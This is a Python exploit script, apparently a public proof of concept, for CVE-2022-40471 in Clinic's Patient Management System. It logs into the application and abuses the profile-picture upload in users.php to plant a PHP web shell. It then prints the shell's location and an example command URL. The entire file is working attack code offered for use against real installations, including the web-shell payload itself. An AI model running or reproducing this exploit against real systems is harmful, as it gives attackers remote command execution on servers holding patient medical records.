#!/usr/bin/env python3
"""
CVE-2022-40471
Clinic's Patient Management System (CPMS) Authenticated File Upload RCE
Author: Dharan Ragunathan
"""

import requests
import sys
import urllib3

urllib3.disable_warnings()


class CPMSRCE:

    @staticmethod
    def authenticate(target, port, base_path, username, password):
        """
        Authenticate to CPMS and return an authenticated session
        """
        base_url = f"https://{target}:{port}{base_path}"

        session = requests.Session()
        session.verify = False

        # Load login page
        r = session.get(base_url, allow_redirects=True)
        if r.status_code not in (200, 302):
            print("[-] Failed to reach login page")
            sys.exit(1)

        # Login request (field names based on actual HTML)
        payload = {
            "user_name": username,
            "password": password,
            "login": "login"
        }

        r = session.post(base_url, data=payload, allow_redirects=True)

        if "Sign In" in r.text or "login" in r.url.lower():
            print("[-] Authentication failed")
            sys.exit(1)

        print("[+] Authentication successful")
        return session

    @staticmethod
    def upload_shell(session, target, port, base_path):
        """
        Upload PHP web shell via vulnerable file upload
        """
        upload_url = f"https://{target}:{port}{base_path}users.php"

        files = {
            "profile_picture": (
                "shell.php",
                "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>",
                "application/octet-stream"
            )
        }

        r = session.post(upload_url, files=files)
        if r.status_code == 200:
            print("[+] Web shell uploaded successfully")
        else:
            print("[-] Shell upload failed")
            sys.exit(1)


def main():
    if len(sys.argv) != 6:
        print(f"Usage: python3 {sys.argv[0]} <host> <port> <base_path> <username> <password>")
        print("Example:")
        print("python3 cpms_rce.py example.com 443 /pms/ admin admin123")
        sys.exit(1)

    target = sys.argv[1]
    port = sys.argv[2]
    base_path = sys.argv[3]
    username = sys.argv[4]
    password = sys.argv[5]

    session = CPMSRCE.authenticate(target, port, base_path, username, password)
    CPMSRCE.upload_shell(session, target, port, base_path)

    print("\n[+] Web shell location:")
    print(f"https://{target}:{port}{base_path}user_images/")
    print("[+] Example usage:")
    print(f"https://{target}:{port}{base_path}user_images/XXXXshell.php?cmd=id")


if __name__ == "__main__":
    main()
